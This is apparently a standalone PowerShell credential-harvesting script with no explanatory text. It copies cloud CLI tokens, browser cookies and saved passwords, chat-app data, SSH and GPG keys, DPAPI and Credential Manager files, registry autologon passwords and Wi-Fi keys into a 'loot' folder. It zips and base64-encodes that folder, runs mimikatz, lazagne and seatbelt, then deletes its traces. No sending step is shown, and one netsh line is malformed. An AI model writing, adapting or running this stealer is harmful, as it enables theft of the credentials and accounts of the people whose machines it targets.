$lootDir = "$env:TEMP\tkn_$((Get-Random -Max 9999))"
New-Item -ItemType Directory -Path $lootDir -Force | Out-Null

$targets = @(
    "$env:LOCALAPPDATA\Microsoft\TokenBroker\Cache",
    "$env:LOCALAPPDATA\Microsoft\.IdentityService\msal.cache",
    "$env:USERPROFILE\.azure\msal_token_cache.json",
    "$env:USERPROFILE\.azure\azureProfile.json",
    "$env:USERPROFILE\.azure\accessTokens.json",
    "$env:USERPROFILE\.azure\msal_http_cache.bin",
    "$env:USERPROFILE\.aws\credentials",
    "$env:USERPROFILE\.aws\config",
    "$env:USERPROFILE\.aws\sso\cache",
    "$env:APPDATA\gcloud\credentials.db",
    "$env:APPDATA\gcloud\application_default_credentials.json",
    "$env:APPDATA\gcloud\access_tokens.db",
    "$env:APPDATA\gcloud\properties",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Mozilla\Firefox\Profiles",
    "$env:APPDATA\Slack\storage\slack-downloads",
    "$env:APPDATA\Slack\Local Storage\leveldb",
    "$env:APPDATA\Microsoft\Teams\Cookies",
    "$env:APPDATA\Microsoft\Teams\Local Storage\leveldb",
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\Signal\config.json",
    "$env:APPDATA\Telegram Desktop\tdata",
    "$env:USERPROFILE\.kube\config",
    "$env:USERPROFILE\.docker\config.json",
    "$env:USERPROFILE\.ssh\id_rsa",
    "$env:USERPROFILE\.ssh\id_ed25519",
    "$env:USERPROFILE\.ssh\known_hosts",
    "$env:USERPROFILE\.gnupg\secring.gpg",
    "$env:USERPROFILE\.gitconfig",
    "$env:USERPROFILE\.git-credentials",
    "$env:APPDATA\FileZilla\recentservers.xml",
    "$env:APPDATA\FileZilla\sitemanager.xml",
    "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
)

foreach ($p in $targets) {
    if (Test-Path $p) {
        try { Copy-Item $p (Join-Path $lootDir (Split-Path $p -Leaf)) -Force -Recurse -ErrorAction Stop } catch {}
    }
}

$dpapiPath = "$env:APPDATA\Microsoft\Protect"
if (Test-Path $dpapiPath) {
    Get-ChildItem $dpapiPath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        Get-ChildItem $_.FullName -File -ErrorAction SilentlyContinue | ForEach-Object {
            try { Copy-Item $_.FullName (Join-Path $lootDir "dpapi_$($_.Name)") -Force -ErrorAction Stop } catch {}
        }
    }
}

$credManPath = "$env:LOCALAPPDATA\Microsoft\Credentials"
if (Test-Path $credManPath) {
    Get-ChildItem $credManPath -File -ErrorAction SilentlyContinue | ForEach-Object {
        try { Copy-Item $_.FullName (Join-Path $lootDir "credman_$($_.Name)") -Force -ErrorAction Stop } catch {}
    }
}

& vaultcmd.exe /list 2>&1 | Out-File (Join-Path $lootDir "vaults.txt") -Force
& vaultcmd.exe /listcreds:"Windows Credentials" /all 2>&1 | Out-File (Join-Path $lootDir "win_creds.txt") -Force
& vaultcmd.exe /listcreds:"Web Credentials" /all 2>&1 | Out-File (Join-Path $lootDir "web_creds.txt") -Force
& cmdkey.exe /list 2>&1 | Out-File (Join-Path $lootDir "cmdkey_creds.txt") -Force

& reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" 2>&1 | Out-File (Join-Path $lootDir "proxy.txt") -Force
& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>&1 | Out-File (Join-Path $lootDir "autologon.txt") -Force
& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName 2>&1 | Out-File (Join-Path $lootDir "autologon_user.txt") -Force
& reg.exe query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 2>&1 | Out-File (Join-Path $lootDir "putty_sessions.txt") -Force
& reg.exe query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s 2>&1 | Out-File (Join-Path $lootDir "winscp_sessions.txt") -Force

Get-ChildItem "$env:USERPROFILE" -Recurse -Include "*.pfx","*.p12","*.pem","*.key","*.jks","*.keystore" -ErrorAction SilentlyContinue | Select-Object -First 5 | ForEach-Object {
    try { Copy-Item $_.FullName (Join-Path $lootDir $_.Name) -Force -ErrorAction Stop } catch {}
}

& wifi netsh wlan export profile key=clear folder=$lootDir 2>&1 | Out-Null
& netsh.exe wlan show profiles 2>&1 | Out-File (Join-Path $lootDir "wifi_profiles.txt") -Force

$archive = "$env:TEMP\cloud_tokens.zip"
try { Compress-Archive -Path "$lootDir\*" -DestinationPath $archive -Force -ErrorAction Stop } catch {}

$encoded = $null
if (Test-Path $archive) {
    try { $encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes($archive)) } catch {}
}

Start-Process "mimikatz.exe" -ArgumentList "`"dpapi::cred /in:$credManPath`"","exit" -NoNewWindow -ErrorAction SilentlyContinue
Start-Process "lazagne.exe" -ArgumentList "all" -NoNewWindow -ErrorAction SilentlyContinue
Start-Process "seatbelt.exe" -ArgumentList "-group=user" -NoNewWindow -ErrorAction SilentlyContinue

Remove-Item $lootDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $archive -Force -ErrorAction SilentlyContinue
